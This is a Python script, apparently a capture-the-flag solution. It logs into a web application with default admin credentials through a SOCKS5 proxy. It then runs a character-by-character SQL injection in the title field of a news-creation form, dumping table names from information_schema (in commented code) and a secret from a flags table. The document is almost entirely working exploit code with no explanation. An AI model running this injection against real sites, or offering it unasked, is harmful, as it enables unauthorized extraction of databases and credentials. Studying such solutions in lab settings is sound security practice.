import requests
import socket
import socks
import re
import time
SOCKS5_PROXY_HOST = '127.0.0.1'
SOCKS5_PROXY_PORT = 4444
default_socket = socket.socket
socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT)
socket.socket = socks.socksocket

url="http://admin.test.com"
s=requests.session()
r=s.get(url)
csrf_cookie_name=r.cookies['csrf_cookie_name']
data={"csrf_test_name":"{0}".format(csrf_cookie_name),"username":"admin","password":"admin"}
r=s.post(url+"/Users/Login",data=data)
# print(r.text)

# Get table name:
# table_id=0
# flag=False
# while True:
# 	char_id=1
# 	table_name=''
# 	while True:
# 		csrf_cookie_name=r.cookies['csrf_cookie_name']
# 		data={"csrf_test_name":csrf_cookie_name,"title":"1' * CONV(HEX(SUBSTRING((Select table_name from information_schema.tables where table_schema=database() limit {0},1), {1}, 1)), 16, 10) * '1".format(table_id,char_id),"content":"b"}
# 		r=s.post(url+"/News/Create",data=data)
# 		if r.status_code==500:
# 			if char_id==1:
# 				flag=True
# 			break
# 		title=re.search(r'<.*>(.*)<.*>',r.text.split("\n")[40])
# 		title=int(title.group(1))
# 		table_name+=chr(title)
# 		char_id+=1
# 		time.sleep(1)
# 	print(table_name)
# 	if flag==True:
# 		break
# 	else:
# 		table_id+=1
char_id=1
flag=''
while True:
	csrf_cookie_name=r.cookies['csrf_cookie_name']
	data={"csrf_test_name":csrf_cookie_name,"title":"1' * CONV(HEX(SUBSTRING((Select flag from flags limit 0,1), {0}, 1)), 16, 10) * '1".format(char_id),"content":"b"}
	r=s.post(url+"/News/Create",data=data)
	if r.status_code==500:
		break
	title=re.search(r'<.*>(.*)<.*>',r.text.split("\n")[40])
	title=int(title.group(1))
	flag+=chr(title)
	char_id+=1
	time.sleep(1)
	pass
print("Flag: "+flag)	